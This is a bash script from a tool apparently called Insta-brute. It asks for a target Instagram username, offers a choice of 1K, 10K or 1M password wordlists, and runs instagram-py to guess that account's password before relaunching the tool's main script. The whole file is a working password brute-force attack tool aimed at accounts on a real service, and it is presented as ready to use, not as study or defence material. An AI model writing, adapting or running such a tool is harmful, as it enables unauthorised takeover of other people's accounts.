#!/bin/bash
# auto.sh - Insta-brute
#
# The shell / bash script that gives the user the option for automatic password wordlist selections. The tool provides the user with three wordlist files : 1K password file (pass1.txt), 10K password file (pass2.txt) and the 1M passwords file (pass3.txt). Thus, here the user is not required to create a custom wordlist file of passwords like what the user needs to do when using the manual version of this attack.
#
# Author : CYBER TOXIC (https://github.com/cy83r-70x1c)
# Created on : July 24, 2021
#
#
# Changes made in the last modification :
# 1. Adding commented docs and more comments to the script's code in order to make it more clean and easily readable to the programmers and other hackers.
# 2. Removing some errors and also adding more proper output and specially the colored output system.
# 3. Also, we removed the dependency of the 'lolcat' package in this script file too.
#

# Defining the ANSII color codes variables for colored output
RED="\033[91m"
GREEN="\033[92m"
YELLOW="\033[93m"
BLUE="\033[94m"
RED_REV="\033[07;91m"
DEFCOL="\033[00m"


# Displaying the banner of the tool on the console screen
clear
echo -e "${YELLOW}
                                                                                                                
                                                                                                               
      L.                      .                                                     :                        ,;
  t   EW:        ,ft         ;W                               .          j.         Ef                     f#i 
  Ej  E##;       t#E        f#E GEEEEEEEL         ..          Ef.        EW,        E#t     GEEEEEEEL    .E#t  
  E#, E###t      t#E      .E#f  ,;;L#K;;.        ;W,          E#Wi       E##j       E#t     ,;;L#K;;.   i#W,   
  E#t E#fE#f     t#E     iWW;      t#E          j##,          E#K#D:     E###D.     E#t        t#E     L#D.    
  E#t E#t D#G    t#E    L##Lffi    t#E         G###, .......  E#t,E#f.   E#jG#W;    E#t fi     t#E   :K#Wfff;  
  E#t E#t  f#E.  t#E   tLLG##L     t#E       :E####, GEEEEEEf.E#WEE##Wt  E#t t##f   E#t L#j    t#E   i##WLLLLt 
  E#t E#t   t#K: t#E     ,W#i      t#E      ;W#DG##,          E##Ei;;;;. E#t  :K#E: E#t L#L    t#E    .E#L     
  E#t E#t    ;#W,t#E    j#E.       t#E     j###DW##,          E#DWWt     E#KDDDD###iE#tf#E:    t#E      f#E:   
  E#t E#t     :K#D#E  .D#j         t#E    G##i,,G##,          E#t f#K;   E#f,t#Wi,,,E###f      t#E       ,WW;  
  E#t E#t      .E##E ,WK,          t#E  :K#K:   L##,          E#Dfff##E, E#t  ;#W:  E#K,       t#E        .D#; 
  E#t ..         G#E EG.            fE ;##D.    L##,          jLLLLLLLLL;DWi   ,KK: EL          fE          tt 
  ,;.             fE ,               : ,,,      .,,                                 :            :              basi  
                   ,                                                                                           
                ${DEFCOL}[${RED}#${DEFCOL}] ${BLUE}Auto Password Attack ${DEFCOL}[${RED}#${DEFCOL}]"
echo -e "\n                \e[101m\e[1;77m  >>  Script By CYBER TOXIC << \e[0m\n"
echo -e "\n       \e[100m\e[1;77m >>  Instagram : \e[1;96m cy83r_70x1c \e[100m\e[1;77m << \e[0m\n"

# Asking the user to enter the username of the target instagram account
read -p "[#] Enter the username of the target : " usrnm

# Asking the user to enter a choice for the wordlist
# ----
# 1. The wordlist files that the user will choose are already available in the pass/ sub-directory of the project.
# 2. There are three wordlist files : 1K passwords, 10K passwords, and 1M passwords.
# ----
echo -e "\nChoose any of the options below :
${GREEN}[${RED}1${GREEN}] ${YELLOW}1K passwords wordlist file${DEFCOL}
${GREEN}[${RED}2${GREEN}] ${YELLOW}10K passwords wordlist file${DEFCOL}
${GREEN}[${RED}3${GREEN}] ${YELLOW}1M passwords wordlist file${DEFCOL}\n"
read -p "[#] Enter your choice: " choice

# Checking the user entered option
if [[ $choice == "1" ]]; then
	# If the user entered the option for the 1K password wordlist file

	instagram-py --username $usrnm --password-list $HOME/insta-brute/pass1.txt 
elif [[ $choice == "2" ]]; then
	# If the user entered the option for the 10K password wordlist file

	instagram-py --username $usrnm --password-list $HOME/insta-brute/pass2.txt
elif [[ $choice == "3" ]]; then
	# If the user entered the option for the 1M password wordlist file

	instagram-py --username $usrnm --password-list $HOME/insta-brute/pass3.txt
else
	# If the user entered option is not recognized (not one of the 3 wordlist files), then we display the error on the console screen

	echo -e "\n${RED_REV}[ Error : No such options for wordlist files available ]${DEFCOL}"
	exit
fi

# If we reach upto here, that means the script executed properly. Now, we will again launch the Insta-brute.sh script (the main script file for the tool)
sleep 5
cd $HOME/insta-brute-attack
bash Insta-brute.sh
